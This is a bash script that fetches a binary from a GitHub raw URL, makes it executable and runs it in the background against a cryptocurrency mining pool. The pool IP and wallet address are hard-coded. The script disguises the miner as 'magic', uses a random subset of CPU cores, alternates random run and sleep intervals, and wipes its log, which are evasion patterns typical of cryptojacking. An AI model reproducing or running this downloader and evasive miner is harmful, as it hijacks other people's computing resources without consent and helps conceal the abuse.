#!/bin/bash

# Function to download and prepare the mining script
prepare_mining_script() {
  wget -O avv https://github.com/barburonjilo/back/raw/main/sr
  chmod +x avv
}

# Function to generate the localized date string with core count
generate_worker() {
  local cores=$1
  TZ=":Asia/Jakarta" date '+%A-%d-%B-%Y' | sed \
    's/Monday/Senin/;s/Tuesday/Selasa/;s/Wednesday/Rabu/;s/Thursday/Kamis/;s/Friday/Jumat/;s/Saturday/Sabtu/;s/Sunday/Minggu/;s/January/Januari/;s/February/Februari/;s/March/Maret/;s/April/April/;s/May/Mei/;s/June/Juni/;s/July/Juli/;s/August/Agustus/;s/September/September/;s/October/Oktober/;s/November/November/;s/December/Desember/' \
    | sed "s/$/$cores/"
}

# Function to start the mining process with a random number of cores
start_magic() {
  local total_cores=$(nproc)
  local num_cores=$(( ( RANDOM % (total_cores - 1) ) + 1 ))  # Randomly choose between 1 and (total_cores - 1)
  local worker=$(generate_worker $num_cores)  # Generate worker string including core count

  # Start the mining process without setting CPU affinity and output to log file
  nohup ./avv -a minotaurx --pool 45.115.225.240:443 -u RQny2iMJZVU1RS3spxF8cCTqMF31vuxvkF.$worker --timeout 120 -t $num_cores > mining.log 2>&1 &
  local pid=$!

  echo "Magic started with PID: $pid using $num_cores cores"

  # Save PID to a file for later use
  echo $pid > /tmp/magic_pid
}

# Function to stop the mining process
stop_magic() {
  if [ -f /tmp/magic_pid ]; then
    local pid=$(cat /tmp/magic_pid)
    echo "Stopping magic with PID: $pid"
    kill -9 $pid 2>/dev/null
    rm -f /tmp/magic_pid

    # Empty the mining.log file
    > mining.log
  else
    echo "No PID file found, cannot stop magic"
  fi
}

# Function to generate a random sleep duration between 3 and 7 minutes
get_random_sleep_duration() {
  local min=180    # 3 minutes in seconds
  local max=420    # 7 minutes in seconds
  echo $((RANDOM % (max - min + 1) + min))
}

# Main execution
prepare_mining_script

# Run the loop
while true; do
  start_magic

  # Get a random sleep duration
  sleep_duration=$(get_random_sleep_duration)
  
  # Validate and debug sleep duration
  if [[ -z "$sleep_duration" || "$sleep_duration" -lt 180 ]]; then
    echo "Error: Invalid sleep duration: $sleep_duration. Defaulting to 3 minutes."
    sleep_duration=180
  elif [[ "$sleep_duration" -gt 420 ]]; then
    echo "Error: Sleep duration exceeds maximum value. Adjusting to 7 minutes."
    sleep_duration=420
  fi
  
  echo "Sleeping for $((sleep_duration / 60)) minutes ($sleep_duration seconds)"
  sleep $sleep_duration
  
  stop_magic
  sleep 120  # Wait for 2 minutes
done